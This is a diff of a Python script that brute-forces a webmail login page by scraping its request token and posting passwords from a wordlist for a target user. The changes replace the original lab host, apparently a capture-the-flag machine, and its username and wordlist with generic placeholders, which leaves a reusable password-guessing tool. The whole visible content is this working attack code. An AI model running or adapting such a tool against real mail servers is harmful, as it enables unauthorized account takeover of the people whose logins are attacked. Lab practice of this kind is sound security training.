@@ -6,7 +6,7 @@ found_pass = None
 
 def obtencion_token():
 
-	r = requests.get('http://mail.phisermansphriends.thl/')
+	r = requests.get('***URL***')
 
 	responseToken = r.text.split("\"request_token\":\"")[1].split("\"});")[0]
 	return responseToken,r.cookies
@@ -26,7 +26,7 @@ def brute(password,user):
 		'_pass':password
 	}
 
-	r = requests.post('http://mail.phisermansphriends.thl/?_task=login',data=payload,cookies=cookie)
+	r = requests.post('***URL***/?_task=login',data=payload,cookies=cookie)
 
 	if 'Login failed' in r.text:
 		print(f'[-]Failed -> {password} -- {token}')
@@ -36,9 +36,9 @@ def brute(password,user):
 	
 def main():
 
-	user = "mur.rusko@phisermansphriends.thl"
+	user = "***USER***"
 
-	with open("mur.txt","r") as file:
+	with open("***PASSWORDLIST***","r") as file:
 		passwords = [line.strip() for line in file]
 
 	hilos = []
